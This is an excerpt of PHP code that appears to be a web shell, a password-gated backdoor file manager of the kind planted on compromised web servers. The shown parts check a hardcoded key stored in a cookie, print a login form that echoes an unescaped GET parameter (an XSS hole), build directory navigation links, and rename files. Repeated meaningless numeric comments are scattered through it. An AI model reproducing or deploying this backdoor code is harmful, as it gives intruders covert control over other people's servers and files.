...
$auth_key = "a34e28037ecf8e41967cecbde1c2da1a";
...
$pass = false;
if (isset($_COOKIE['pw_name_63530'])) {
    if(($_COOKIE['pw_name_63530']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_63530'])) {
        if(($_POST['pw_name_63530']) == $auth_key) {
            setcookie("pw_name_63530", $_POST['pw_name_63530']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_63530' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738170266256645 1738170266531822 1738170266992201 1738170266324418
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738170266256645 1738170266531822 1738170266992201 1738170266324418
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738170266256645 1738170266531822 1738170266992201 1738170266324418
            $name = PATH . "/" . $_GET['r'];
